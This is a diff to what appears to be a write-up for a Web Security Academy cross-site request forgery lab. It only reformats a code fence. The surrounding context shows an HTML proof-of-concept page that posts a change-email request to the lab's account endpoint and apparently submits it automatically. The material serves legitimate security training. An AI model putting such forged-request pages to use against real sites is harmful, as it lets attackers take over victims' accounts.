@@ -40,8 +40,8 @@ vulnerability.
    into 0ac700f10457e2fee5479a1900a50016.web-security-academy[.]net visits the attacker's website, their email address will be changed on
    0ac700f10457e2fee5479a1900a50016.web-security-academy[.]net.
 
-   ```
-   <!DOCTYPE html>
+```
+<!DOCTYPE html>
 <html>
 <body>
       <form action="https://0ac700f10457e2fee5479a1900a50016.web-security-academy.net/my-account/change-email" method="POST">
@@ -52,5 +52,5 @@ vulnerability.
     </script>
 </body>
 </html>
-   ```
+```
 
